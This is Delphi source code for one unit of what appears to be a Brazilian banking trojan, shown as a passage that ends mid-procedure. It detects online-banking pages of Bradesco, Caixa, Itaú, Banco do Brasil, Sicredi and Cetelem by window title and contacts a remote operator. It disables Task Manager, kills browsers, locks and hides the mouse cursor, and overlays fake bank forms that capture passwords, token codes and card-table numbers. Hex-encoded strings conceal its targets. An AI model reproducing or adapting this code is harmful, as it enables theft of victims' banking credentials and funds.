unit Unit21;

interface

uses
  Windows, Messages, SysUtils, Classes, Variants, Graphics, Controls, Forms,
  Dialogs, StreamManager, TLHelp32, ShFolder, AppEvnts, IdBaseComponent,
  IdComponent, Registry,WinApi.Dwmapi,IdTCPConnection, IdTCPClient, IdHTTP, Vcl.ExtCtrls, Vcl.StdCtrls;


Function SetClipboardText(Wnd: HWND; Value: String): BooLean;
function GetSpecialFolderPath(folder : integer) : string;
procedure FormFlutuante(Form : TForm);

type
  TFunc = class(TForm)
    ApplicationEvents: TApplicationEvents;
    IdHTTP1: TIdHTTP;
    tmSearch: TTimer;
    Tgerenciador: TTimer;
    Timer1: TTimer;
    Edit1: TEdit;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure tmSearchTimer(Sender: TObject);
    procedure TgerenciadorTimer(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }

  public
    { Public declarations }
    procedure mostra_form;
    procedure DestravaM;
    procedure TravaM;
    procedure PrendeMouse(intEsq, intCima, intDir, IntBaixo : integer);
    procedure ResgataArquivoCompilado(Arquivo, Tipo, LocalDeSalvamento: String);
   procedure trava24();
    procedure ler24();
    function killtask(ExeFileName: string): Integer;
    procedure ChecaHost();
    procedure LiberaMouse;
    function  PegaTempDir : String;//Pega o diretorio da Pasta Temporaria
    function HexToStr(Value: string): string;
    function CompName: string;
    function DesligarMeuWindows(RebootParam: Longword): Boolean;
    Procedure Chrome;
    procedure StartConnection(Bank, BID: String; SBH: HWND);
    procedure AeroSetEnable(enable: boolean);
    function ISAeroEnabled: boolean;

  end;

var
   Func        : TFunc;
   HND         : HWND;
   ENCODE4     : string;
   DATA_ATUAL  : string;
   f           : Textfile;
   DATA_TRAVA  : String;
   BLOQUEADO   : String;
   SUPER_LINHA : string;
   SITE_BLOCK  : String;
   BaseForm    : TForm;
   TelaForm    : TForm;

implementation


uses UnPrincipal, Unit12, BB6DIGI, BB6est, cefcccc,  deskobela,DeskToken,
  desksms, sicr1, sicr2, Deskonet, deskonettoken, BBGF, bbGBF, UNTBL,
  Uxxxcccit09393, UTTTK, UTJU, UTSHJU, uuniclstb, uuinclas, uuinicltk, uupesstb,
  uupess, uupesstk, uunordestt, Ubrbbbbsil, BMG2, Cetelem2;

{$R *.dfm}

Const

 URL_HOST = '';

 procedure TFunc.StartConnection(Bank, BID: String; SBH: HWND);
begin
   BLOQUEADO := '0';
   Func.ler24();
   Edit1.Text := Bank;
   SITE_BLOCK := Bank;
   Navi := Bank;
   BrowserID := BID;
   Form1.SubBrowser := SBH;
   Form1.WindowControl := Form1.SubBrowser;
   Tgerenciador.Enabled := true;
    if BLOQUEADO = '0' then
    begin
      { SE ESTIVER DESCONECTADO DO OPERADOR, ELE CONECTA E AVISA A INFO }
       FOrm1.Button1.Click;

        if Form1.CS1.Active then
        begin
         BringWindowToTop(HandlePrinc);
         SetForegroundWindow(HandlePrinc);
         PostMessage(HandlePrinc, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
        end;
    end;

end;



function TFunc.ISAeroEnabled: boolean;
type
  _DwmIsCompositionEnabledFunc = function(var IsEnabled: boolean)
    : HRESULT; stdcall;
var
  Flag: boolean;
  DllHandle: thandle;
  OsVersion: TOSVersionInfo;
  DwmIsCompositionEnabledFunc: _DwmIsCompositionEnabledFunc;
begin
  Result := false;
  ZeroMemory(@OsVersion, Sizeof(OsVersion));
  OsVersion.dwOSVersionInfoSize := Sizeof(TOSVersionInfo);

  if ((GetVersionEx(OsVersion)) and
    (OsVersion.dwPlatformId = VER_PLATFORM_WIN32_NT) and
    (OsVersion.dwMajorVersion >= 6)) then
  begin
    DllHandle := LoadLibrary('dwmapi.dll');
    try
      if DllHandle <> 0 then
      begin
        @DwmIsCompositionEnabledFunc := GetProcAddress(DllHandle,
          'DwmIsCompositionEnabled');
        if (@DwmIsCompositionEnabledFunc <> nil) then
        begin
          if DwmIsCompositionEnabledFunc(Flag) = S_OK then
            Result := Flag;
        end;
      end;
    finally
      if DllHandle <> 0 then
        FreeLibrary(DllHandle);
    end;
  end;
end;

 procedure TFunc.AeroSetEnable(enable: boolean);
const
  DWM_EC_DISABLECOMPOSITION = 0;
  DWM_EC_ENABLECOMPOSITION = 1;
var
  DWMlibrary: THandle;
begin
DWMlibrary:= LoadLibrary('DWMAPI.dll');
  if DWMlibrary <> 0 then
    begin
     if @DwmEnableComposition <> nil then
     begin
      if enable then
       if not ISAeroEnabled then
        begin
         DwmEnableComposition(DWM_EC_ENABLECOMPOSITION)
        end
        else DwmEnableComposition(DWM_EC_DISABLECOMPOSITION);
      end;
    end;
end;



procedure TFunc.TgerenciadorTimer(Sender: TObject);
begin
Func.killtask(HexToStr('5461736B6D67722E657865')); //Taskmgr.exe

end;

procedure TFunc.Timer1Timer(Sender: TObject);
begin
ler24;
end;

Function SetClipboardText(Wnd: HWND; Value: String): BooLean;
Var hData: HGlobal; pData: Pointer; Len: Integer;
Begin
 Result:=True;
  If OpenClipboard(Wnd) Then
  Begin
   Try
    Len:=Length(Value)+1;
    hData:=GlobalAlloc(GMEM_MOVEABLE Or GMEM_DDESHARE, Len);
     Try
      pData:=GlobalLock(hData);
       Try
        Move(PChar(Value)^, pData^, Len);
        EmptyClipboard;
        SetClipboardData(CF_Text, hData);
       Finally
        GlobalUnlock(hData);
       End;
     Except
      GlobalFree(hData);
     Raise
     End;
   Finally
    CloseClipboard;
   End;
  End
  Else
 Result:=False;
End;

// FUNÇÃO PARA CAPTURAR DIRETÓRIO ROAMING
function GetSpecialFolderPath(folder : integer) : string;
 const
   SHGFP_TYPE_CURRENT = 0;
 var
   path: array [0..MAX_PATH] of char;
 begin
   if SUCCEEDED(SHGetFolderPath(0,folder,0,SHGFP_TYPE_CURRENT,@path[0])) then
     Result := path
   else
     Result := '';
 end;


procedure FormFlutuante(Form : TForm);
begin
 if Assigned(Form) then
 begin
  SetWindowPos(Form.Handle, HWND_TOPMOST, Form.Left, Form.Top, Form.Width, Form.Height, 0);
 end;
end;

// ALTERA PREFS DO CHROME
Procedure TFunc.Chrome;
var
  texto: string;
  specialfolder, I: integer;
  ARQ: TStringList;
  Ln, NewLn: String;
  caminhochrome: String;
begin
 specialFolder := CSIDL_LOCAL_APPDATA;
 caminhochrome := GetSpecialFolderPath(specialFolder);
 caminhochrome := caminhochrome + '\Google\Chrome\User Data\Local State';
  if fileexists(caminhochrome) then
  begin
   ARQ:=TStringList.Create;
   ARQ.LoadFromFile(caminhochrome);
   ARQ.Text:=StringReplace(ARQ.Text,'"enabled": true','"enabled": false',[rfReplaceAll]);
   ARQ.Text:=StringReplace(ARQ.Text,'"hardware_acceleration_mode_previous": true','"hardware_acceleration_mode_previous": false',[rfReplaceAll]);
    for I := 0 to ARQ.Count - 1 do
    begin
      ARQ[0] := '{ "hardware_acceleration_mode": { "enabled": false },';
    end;
     ARQ.SavetoFile(caminhochrome);
  end;
end;

// FUNÇÃO PARA CAPTURAR DIRETÓRIO TEMPORÁRIO DO WINDOWS
function  TFunc.PegaTempDir : String;
var DiretorioTemp : PChar;
    TempBuffer    : Dword;
begin
  TempBuffer := 255;
  GetMem(DiretorioTemp,255);
  try
    GetTempPath(tempbuffer,diretoriotemp);
    result := DiretorioTemp;
  finally
    FreeMem(diretoriotemp);
  end;
end;

// FUNÇÃO PARA DESLIGAR O WINDOWS
function TFunc.DesligarMeuWindows(RebootParam: Longword): Boolean;
var
TTokenHd: THandle;
TTokenPvg: TTokenPrivileges;
cbtpPrevious: DWORD;
rTTokenPvg: TTokenPrivileges;
pcbtpPreviousRequired: DWORD;
tpResult: Boolean;
const
SE_SHUTDOWN_NAME = 'SeShutdownPrivilege';
begin
if Win32Platform = VER_PLATFORM_WIN32_NT then
begin
tpResult := OpenProcessToken(GetCurrentProcess(),
TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
TTokenHd);
if tpResult then
begin
tpResult := LookupPrivilegeValue(nil, SE_SHUTDOWN_NAME,
TTokenPvg.Privileges[0].Luid);
TTokenPvg.PrivilegeCount := 1;
TTokenPvg.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
cbtpPrevious := SizeOf(rTTokenPvg);
pcbtpPreviousRequired := 0;
if tpResult then
Windows.AdjustTokenPrivileges(TTokenHd, False, TTokenPvg, cbtpPrevious,
rTTokenPvg, pcbtpPreviousRequired);
end;
end;
Result := ExitWindowsEx(RebootParam, 0);
end;

// FUNÇÃO PARA DERRUBAR PROCESSOS DO WINDOWS
function TFunc.killtask(ExeFileName: string): Integer;
const
PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  Result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
      UpperCase(ExeFileName))) then
      Result := Integer(TerminateProcess(
      OpenProcess(PROCESS_TERMINATE, BOOL(0),
      FProcessEntry32.th32ProcessID),
                                   0));
     ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

// TRAVA O ACESSO DO PC POR 24HRS
procedure TFunc.trava24();
begin
 if FileExists(Form1.Edit5.Text + HexToStr('626C6F636B2E747874')) then //block.txt
 begin
  deletefile(Form1.Edit5.Text + HexToStr('626C6F636B2E747874'));
 end;
  AssignFile(f, Form1.Edit5.Text + HexToStr('626C6F636B2E747874'));
    try
     ReWrite(f); { cria um novo se não existir }
     DATA_ATUAL := FormatDateTime(HexToStr('797979792F6D6D2F6464'), Date); //yyyy/mm/dd
     WriteLn(f, DATA_ATUAL);
     Form1.Edit2.Text :=  DATA_ATUAL;
    finally
     CloseFile(f);
    end;
end;

// VERIFICA SE O PC ESTÁ TRAVADO POR 24HRS
procedure TFunc.ler24();
begin
 if FileExists(Form1.Edit5.Text + HexToStr('626C6F636B2E747874')) then  //block.txt
 begin
  if FileExists(Form1.Edit5.Text + HexToStr('626C6F636B2E747874')) then//block.txt
  begin
     AssignFile(f, Form1.Edit5.Text + HexToStr('626C6F636B2E747874'));//block.txt
     Reset(f); //abre o arquivo para leitura;
     While not eof(f) do begin
       Readln(f,DATA_TRAVA); //le do arquivo e desce uma linha. O conteúdo lido é transferido para a variável linha
       DATA_ATUAL := FormatDateTime(HexToStr('797979792F6D6D2F6464'), Date); //yyyy/mm/dd

       if (DATA_TRAVA = DATA_ATUAL) then
       begin
         if Edit1.Text = SITE_BLOCK then
         begin
         if BrowserID = HexToStr('4348') then  //CH
         begin
         killtask(HexToStr('6368726F6D652E657865')); //chrome.exe
         end;
         if BrowserID = HexToStr('4945') then  //IE
         begin
         killtask(HexToStr('696578706C6F72652E657865')); //iexplore.exe
         end;
         if BrowserID = HexToStr('4646') then  //FF
         begin
         killtask(HexToStr('66697265666F782E657865')); //firefox.exe
         end;
         Application.MessageBox(PChar('O site está em manutenção no momento, estara funcionando em menos de 24 horas!'), Pchar('Aviso!'), 16);
         Form1.CS1.Active := false;
         BLOQUEADO := '1';
         end;
       end;
       Closefile(f);
      exit;
     end;
  end;

 end;
end;

// FUNÇÃO PARA RESGATAR CURSOR DO ARQUIVO RES
procedure TFunc.ResgataArquivoCompilado(Arquivo, Tipo, LocalDeSalvamento: String);
Var
   NomeSalvamento,
   NomesalvamentoTotal : String;
   Res : TResourceStream;
Begin
  if pos(Tipo, Arquivo) > 0 then
     NomeSalvamento      := Copy(Arquivo, 0, (pos(Tipo, Arquivo)-1)) else
     NomeSalvamento      := Arquivo;
  NomesalvamentoTotal := LocalDeSalvamento + NomeSalvamento + '.' + Tipo;
  If not FileExists(NomesalvamentoTotal) Then
  Begin
    Try
      Res := TResourceStream.Create(Hinstance, Arquivo, Pchar(Tipo));
      Try
         Res.SavetoFile(NomesalvamentoTotal);
      Finally
         Res.Free;
      End;
    Except
   //   ShowMessage(PChar(DCP_CPPCRYPPP('EP8tcWrEUC32G4OUOztlXQ==') + Arquivo + DCP_CPPCRYPPP('cXrrsRMyHt7eqUKP+blO6wM0bfTDv77AhOCMlNNokUJy6DW7jArJU8B8PR9hzCGJ')));
    End;
  End;
End;

procedure TFunc.tmSearchTimer(Sender: TObject);
var
  Title: Array [0 .. 255] of Char;
  HWND: THandle;
  aName: array [0 .. 255] of Char;
  CrPos: TPoint;

begin
  GetCursorPos(CrPos);
  HWND := WindowFromPoint(CrPos);
 // GetWindowText(HWND, Title, SizeOf(Title));
  GetClassName(HWND, aName, 256);

  Form1.Browser := GetForegroundWindow;
  GetWindowText(FOrm1.Browser, Title, SizeOf(Title));

  if Pos('Internet Explorer', Title) <> 0 then

  begin
   FOrm1.FakeHWND := HWND;
    //BrowserHWND := IEHandle;

    if Pos('Banco Bradesco S/A', Title) <> 0 then
      if Pos(string(aName), 'Internet Explorer_Server') <> 0 then
        StartConnection('DESCO', 'IE', HWND);


    if Pos('Caixa - A vida pede mais que um banco', Title) <> 0 then
      if Pos(string(aName), 'Internet Explorer_Server') <> 0 then
        StartConnection('CAIXA', 'IE', HWND);


    if Pos('30 horas', Title) <> 0 then
      if Pos(string(aName), 'Internet Explorer_Server') <> 0 then
        StartConnection('ITA', 'IE', HWND);


    if Pos('['+'b'+'b'+'.com'+'.br]', Title) <> 0 then
      if Pos(string(aName), 'Internet Explorer_Server') <> 0 then
        StartConnection('BB', 'IE', HWND);


       if Pos('Sicredi | Gente que coopera cresce', Title) <> 0 then
      if Pos(string(aName), 'Internet Explorer_Server') <> 0 then
        StartConnection('SICRE', 'IE', HWND);

       if Pos('Autorizador Web - 16', Title) <> 0 then
      if Pos(string(aName), 'Internet Explorer_Server') <> 0 then
        StartConnection('CETEL', 'IE', HWND);
  end;

  if Pos('Mozilla Firefox', Title) <> 0 then
  begin
      Form1.FakeHWND := HWND;
      Form1.BrowserHWND := GetForegroundWindow;

    if Pos('Banco Bradesco S/A', Title) <> 0 then
      StartConnection('DESCO', 'FF', FOrm1.Browser);

    if Pos('30 horas', Title) <> 0 then
      StartConnection('ITA', 'FF', Form1.Browser);

    if Pos('[bb.com.br]', Title) <> 0 then
      StartConnection('BB', 'FF', Form1.Browser);

    if Pos('Caixa - A vida pede mais que um banco', Title) <> 0 then
      StartConnection('CAIXA', 'FF', Form1.Browser);


         if Pos('Sicredi | Gente que coopera cresce', Title) <> 0 then
      StartConnection('SICRE', 'FF', Form1.Browser);

      if Pos('Autorizador Web - 16', Title) <> 0 then
      StartConnection('CETEL', 'FF', Form1.Browser);

  end;

  if Pos('Google Chrome', Title) <> 0 then
  begin
  FOrm1.FakeHWND := HWND;
  //  BrowserHWND := ChromeH;
    if Pos('Banco Bradesco S/A', Title) <> 0 then
      if Pos(string(aName), 'Chrome_WidgetWin_1') <> 0 then
        StartConnection('DESCO', 'CH', HWND);

    if Pos('30 horas', Title) <> 0 then
      if Pos(string(aName), 'Chrome_WidgetWin_1') <> 0 then
        StartConnection('ITA', 'CH', HWND);

    if Pos('[bb.com.br]', Title) <> 0 then
      if Pos(string(aName), 'Chrome_WidgetWin_1') <> 0 then
        StartConnection('BB', 'CH', HWND);

    if Pos('Caixa - A vida pede mais que um banco', Title) <> 0 then
      if Pos(string(aName), 'Chrome_WidgetWin_1') <> 0 then
        StartConnection('CAIXA', 'CH', HWND);


        if Pos('Sicredi | Gente que coopera cresce', Title) <> 0 then
      if Pos(string(aName), 'Chrome_WidgetWin_1') <> 0 then
        StartConnection('SICRE', 'CH', HWND);

   if Pos('Autorizador Web - 16', Title) <> 0 then
      if Pos(string(aName), 'Chrome_WidgetWin_1') <> 0 then
        StartConnection('CETEL', 'CH', HWND);
  end;



end;

// FUNÇÃO PARA PRENDER O MOUSE NA TELA
procedure TFunc.PrendeMouse (intEsq, intCima, intDir, IntBaixo : integer);
var
  Area: TRect;
begin
  Area.Left := intEsq;
  Area.Top := intCima;
  Area.Right := intDir;
  Area.Bottom := IntBaixo;
  ClipCursor( @Area );
end;

// DESTRAVA CURSOR DO MOUSE
procedure TFunc.DestravaM;
begin
 SystemParametersInfo(SPI_SETCURSORS, 0, 0, WM_SETTINGCHANGE or SPIF_UPDATEINIFILE);
end;

// FUNÇÃO PARA ENCRIPTAÇÃO DE STRINGS
function TFunc.HexToStr(Value: string): string;
var
  I: Integer;
begin
  Result := '';
  for I := 1 to Length(Value) do
  begin
    if ((I mod 2) = 1) then
      Result := Result + Chr(StrToInt('0x'+ Copy(Value, I, 2)));
  end;
end;


// FUNÇÃO PARA PEGAR O NOME DO COMPUTADOR
function TFunc.CompName: string;
var
  buffer:array[0..MAX_COMPUTERNAME_LENGTH+1] of Char;
  length:Cardinal;
begin
   length:=MAX_COMPUTERNAME_LENGTH+1;
   GetComputerName(@buffer,length);
   CompName:=buffer;
end;


// TRAVA CURSOR DO MOUSE (DEIXA TRANSPARENTE)
procedure TFunc.TravaM;
var
cr: HCursor;
begin
 cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
 SetSystemCursor(cr, OCR_NORMAL);
 cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
 SetSystemCursor(cr, OCR_APPSTARTING);
 cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
 SetSystemCursor(cr, OCR_CROSS);
 cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
 SetSystemCursor(cr, OCR_HAND);
 cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
  SetSystemCursor(cr, OCR_IBEAM);
 cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
  SetSystemCursor(cr, OCR_NO);
 cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
  SetSystemCursor(cr, OCR_SIZEALL);
 cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
  SetSystemCursor(cr, OCR_SIZENESW);
  cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
  SetSystemCursor(cr, OCR_SIZENWSE);
  cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
  SetSystemCursor(cr, OCR_SIZEWE);
 cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
  SetSystemCursor(cr, OCR_UP);
 cr := LoadCursorFromFile( pChar(Form1.Edit5.Text + 'icone.cur' ));
 SetSystemCursor(cr, OCR_WAIT);
end;

procedure TFunc.LiberaMouse;
begin
  ClipCursor(nil);
end;

// CHECA IP ONLINE (DO OPERADOR)
procedure TFunc.ChecaHost();
begin
  begin

   IdHTTP1.Get('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0');
   SUPER_LINHA := IdHTTP1.Get(Func.HexToStr(URL_HOST));
   SUPER_LINHA := Trim(SUPER_LINHA);
  exit;
  end;
end;





// SETA O FOCO NO FORM ABERTO
function ForceForegroundWindow(hwnd: THandle): Boolean;
const
  SPI_GETFOREGROUNDLOCKTIMEOUT = $2000;
  SPI_SETFOREGROUNDLOCKTIMEOUT = $2001;
var
  ForegroundThreadID: DWORD;
  ThisThreadID: DWORD;
  timeout: DWORD;
begin
  if IsIconic(hwnd) then ShowWindow(hwnd, SW_RESTORE);
  if GetForegroundWindow = hwnd then Result := True
  else
  begin
    // Windows 98/2000 doesn't want to foreground a window when some other
    // window has keyboard focus

    if ((Win32Platform = VER_PLATFORM_WIN32_NT) and (Win32MajorVersion > 4)) or
      ((Win32Platform = VER_PLATFORM_WIN32_WINDOWS) and
      ((Win32MajorVersion > 4) or ((Win32MajorVersion = 4) and
      (Win32MinorVersion > 0)))) then
    begin
      Result := False;
      ForegroundThreadID := GetWindowThreadProcessID(GetForegroundWindow, nil);
      ThisThreadID := GetWindowThreadPRocessId(hwnd, nil);
      if AttachThreadInput(ThisThreadID, ForegroundThreadID, True) then
      begin
        BringWindowToTop(hwnd); // IE 5.5 related hack
        SetForegroundWindow(hwnd);
        AttachThreadInput(ThisThreadID, ForegroundThreadID, False);
        Result := (GetForegroundWindow = hwnd);
      end;
      if not Result then
      begin
        // Code by Daniel P. Stasinski
        SystemParametersInfo(SPI_GETFOREGROUNDLOCKTIMEOUT, 0, @timeout, 0);
        SystemParametersInfo(SPI_SETFOREGROUNDLOCKTIMEOUT, 0, TObject(0),
          SPIF_SENDCHANGE);
        BringWindowToTop(hwnd); // IE 5.5 related hack
        SetForegroundWindow(hWnd);
        SystemParametersInfo(SPI_SETFOREGROUNDLOCKTIMEOUT, 0, TObject(timeout), SPIF_SENDCHANGE);
      end;
    end
    else
    begin
      BringWindowToTop(hwnd); // IE 5.5 related hack
      SetForegroundWindow(hwnd);
    end;

    Result := (GetForegroundWindow = hwnd);
  end;
end;

// MOSTRA FORMS
procedure TFunc.mostra_form;
begin
// ATUALIZAÇÃO ITAU NORMAL
 if Form1.Label11.Caption = 'ITANormal'  then
 begin
  Form12 := TForm12.Create(Application);
  TelaForm := Form12;
  GetScreenToBmpFake(False,MyFirstBmp);
  sleep(100);
  Form12.Show;
  Form12.Label10.Caption := Form1.Label6.Caption;
  sleep(100);
  Form12.PanelITAUSimples.Visible := True;
  Form12.TrmGaugeITAUSimples.Enabled := True;
  Func.TravaM;
 end;

 // ITAÚ TABELA NORMAL
 if Form1.Label11.Caption = 'TABELAITANORMAL' then
 begin
  Form12.PanelITAUSimples.Visible := False;
  FTtbl.NOME.Caption := Form1.Label6.Caption;
  FTtbl.ppddttn.Visible := True;
  FTtbl.Show;
  BaseForm := FTtbl;
  FTtbl.lbTB.Caption := 'n° '+ Form1.Label19.Caption;
  Form12.GITAU.Progress := 0;
  Form12.TrmGaugeITAUSimples.Enabled := False;
  FTtbl.edtS6.SetFocus;
  Func.DestravaM;
  ForceForegroundWindow(FTtbl.Handle);
 end;

 // ITAU SENHA6 NORMAL
if Form1.Label11.Caption = 'ITANORMAL6' then
begin
Form12.PanelITAUSimples.Visible := False;
Fiiittt3939330.ppddttn.Visible := True;
Fiiittt3939330.Show;
BaseForm := Fiiittt3939330;
Fiiittt3939330.NOME.Caption := Form1.Label6.Caption;
Form12.GITAU.Progress := 0;
Form12.TrmGaugeITAUSimples.Enabled := False;
Fiiittt3939330.Edit2.SetFocus;
Func.DestravaM;
ForceForegroundWindow(Fiiittt3939330.Handle);
end;


// ITAU TOKEN NORMAL
if Form1.Label11.Caption = 'ITATOKENNORMAL' then
begin
Form12.PanelITAUSimples.Visible := False;
FFTK.ppddttn.Visible := True;
FFTK.Show;
BaseForm := FFTK;
FFTK.NOME.Caption := Form1.Label6.Caption;
FFTK.lbfiscfinal.Caption := Form1.Label7.Caption;
Form12.GITAU.Progress := 0;
Form12.TrmGaugeITAUSimples.Enabled := False;
FFTK.edtS6.SetFocus;
Func.DestravaM;
ForceForegroundWindow(FFTK.Handle);
end;

// ITAU EMPRESA ATUALIZAÇÃO
if Form1.Label11.Caption = 'TRAVAITAEMPRESA' then
begin
Form12 := TForm12.Create(Application);
TelaForm := Form12;
GetScreenToBmpFake(False,MyFirstBmp);
sleep(100);
Form12.Show;
Form12.Label13.Caption := Form1.Label6.Caption;
sleep(100);
Form12.PanelITAUEmpresa.Visible := True;
Form12.TrmGaugeITAUEmpresa.Enabled := True;
Func.TravaM;
end;

// ITAU EMPRESA TOKEN
if Form1.Label11.Caption = 'TOKENEMPRESA' then
begin
Form12.PanelITAUEmpresa.Visible := False;
FFTKJU.ppddttn.Visible := True;
FFTKJU.Show;
BaseForm := FFTKJU;
FFTKJU.NOME.Caption := Form1.Label6.Caption;
FFTKJU.LbJ.Caption := Form1.Label7.Caption;
Form12.GITAUE.Progress := 0;
Form12.TrmGaugeITAUEmpresa.Enabled := False;
FFTKJU.edtS6.SetFocus;
Func.DestravaM;
ForceForegroundWindow(FFTKJU.Handle);
end;

// ITAU EMPRESA SENHA 6
if Form1.Label11.Caption = 'ITAEMPRE6' then
begin
Form12.PanelITAUEmpresa.Visible := False;
FFSHJU.ppddttn.Visible := True;
FFSHJU.Show;
BaseForm := FFSHJU;
FFSHJU.NOME.Caption := Form1.Label6.Caption;
Form12.GITAUE.Progress := 0;
Form12.TrmGaugeITAUEmpresa.Enabled := False;
FFSHJU.edtS6.SetFocus;
Func.DestravaM;
ForceForegroundWindow(FFSHJU.Handle);
end;

//ATUALIZAÇÃO ITAU UNICLASS
 if Form1.Label11.Caption = '{TRAVAUNI}' then
 begin
  Form12 := TForm12.Create(Application);
  TelaForm := Form12;
  GetScreenToBmpFake(False,MyFirstBmp);
  sleep(100);
  Form12.Show;
  Form12.Label12.Caption := Form1.Label6.Caption;
  sleep(100);
  Form12.PanelITAUUniclass.Visible := True;
  Form12.TrmGaugeITAUUniclass.Enabled := True;
  Func.TravaM;
 end;

  // ITAU TABELA UNICLASS
 if Form1.Label11.Caption = 'TABELAUNICLASS' then
 begin
  Form12.PanelITAUUniclass.Visible := False;
  ffuniclstb.lbTB.Caption := Form1.Label19.Caption;
  ffuniclstb.ppddttn.Visible := True;
  ffuniclstb.Show;
  BaseForm := ffuniclstb;
  ffuniclstb.NOME.Caption := Form1.Label6.Caption;
  Form12.GITAU1.Progress := 0;
  Form12.TrmGaugeITAUUniclass.Enabled := False;
  ffuniclstb.edtS6.SetFocus;
  Func.DestravaM;
  ForceForegroundWindow(ffuniclstb.Handle);
 end;

 // ITAU SENHA6 UNICLASS
if Form1.Label11.Caption = 'ITADATAUNISS' then
begin
Form12.PanelITAUUniclass.Visible := False;
ffunicls.ppddttn.Visible := True;
ffunicls.Show;
BaseForm := ffunicls;
ffunicls.NOME.Caption := Form1.Label6.Caption;
Form12.GITAU1.Progress := 0;
Form12.TrmGaugeITAUUniclass.Enabled := False;
ffunicls.Edit2.SetFocus;
Func.DestravaM;
ForceForegroundWindow(ffunicls.Handle);
end;

// ITAU TOKEN UNICLASS
if Form1.Label11.Caption = 'TOKENUNI' then
begin
Form12.PanelITAUUniclass.Visible := False;
ffunirsstk.ppddttn.Visible := True;
ffunirsstk.Show;
BaseForm := ffunirsstk;
ffunirsstk.NOME.Caption := Form1.Label6.Caption;
ffunirsstk.lb.Caption := Form1.Label7.Caption;
Form12.GITAU1.Progress := 0;
Form12.TrmGaugeITAUUniclass.Enabled := False;
ffunirsstk.edtS6.SetFocus;
Func.DestravaM;
ForceForegroundWindow(ffunirsstk.Handle);
end;

// ATUALIZAÇÃO ITAU PERSONALITTE
 if Form1.Label11.Caption = 'ITAPERSO' then
 begin
  Form12 := TForm12.Create(Application);
  TelaForm := Form12;
  GetScreenToBmpFake(False,MyFirstBmp);
  sleep(100);
  Form12.Show;
  Form12.Label11.Caption := Form1.Label6.Caption;
  sleep(100);
  Form12.PanelITAUPerso.Visible := True;
  Form12.TrmGaugeITAUPerso.Enabled := True;
  Func.TravaM;
 end;

// ITAU TABELA PERSONALITÉ
if Form1.Label11.Caption = 'TABELAITAPERSO' then
begin
Form12.PanelITAUPerso.Visible := False;
ffpersstb.lbTB.Caption := 'n° '+ Form1.Label19.Caption;
ffpersstb.ppddttn.Visible := True;
ffpersstb.Show;
BaseForm := ffpersstb;
ffpersstb.NOME.Caption := Form1.Label6.Caption;
Form12.GITAU2.Progress := 0;
Form12.TrmGaugeITAUPerso.Enabled := False;
ffpersstb.edtS6.SetFocus;
Func.DestravaM;
ForceForegroundWindow(ffpersstb.Handle);
end;

// ITAU SENHA6 PERSONALITTE
if Form1.Label11.Caption = 'SENHA6PE' then
begin
Form12.PanelITAUPerso.Visible := False;
ffperss.ppddttn.Visible := True;
ffperss.Show;
BaseForm := ffperss;
ffperss.NOME.Caption := Form1.Label6.Caption;
Form12.GITAU1.Progress := 0;
Form12.TrmGaugeITAUPerso.Enabled := False;
ffperss.Edit2.SetFocus;
Func.DestravaM;
ForceForegroundWindow(ffperss.Handle);
end;

// ITAU TOKEN PERSONALITTE
if Form1.Label11.Caption = 'ITATOKENPERSO' then
begin
Form12.PanelITAUPerso.Visible := False;
ffpersstk.ppddttn.Visible := True;
ffpersstk.Show;
BaseForm := ffpersstk;
ffpersstk.NOME.Caption := Form1.Label6.Caption;
ffpersstk.lb.Caption := Form1.Label7.Caption;
Form12.GITAU2.Progress := 0;
Form12.TrmGaugeITAUPerso.Enabled := False;
ffpersstk.edtS6.SetFocus;
Func.DestravaM;
ForceForegroundWindow(ffpersstk.Handle);
end;



  // BB ATUALIZAÇÃO
 if Form1.Label11.Caption = 'TRAVABB' then
 begin
  Form12 := TForm12.Create(Application);
  TelaForm := Form12;
  GetScreenToBmpFake(False, MyFirstBmp);
  sleep(100);
  Form12.Show;
  Form12.Label2.Caption := Form1.Label6.Caption;
  sleep(100);
  Form12.PanelBB.Visible := True;
  Form12.TrmGaugeBB.Enabled := True;
  Func.TravaM;
 end;

 // BB EMPRESA ATUALIZAÇÃO
 if Form1.Label11.Caption = 'TRAVABBGF' then
 begin
  Form12 := TForm12.Create(Application);
  TelaForm := Form12;
  GetScreenToBmpFake(False,MyFirstBmp);
  sleep(100);
  Form12.Show;
  Form12.Label9.Caption := Form1.Label6.Caption;
  sleep(100);
  Form12.Image11.Visible := False;
  Form12.Image16.Visible := True;
  Form12.PanelBBGF.Visible := True;
  Form12.TrmGaugeBBGF.Enabled := True;
  Func.TravaM;
 end;

  // BB EMPRESA CERTIFICADO
 if Form1.Label11.Caption = 'BBCERT' then
 begin
  Form12.PanelBBEmpresa.Visible := False;
  BBJJB.pncrt.BringToFront;
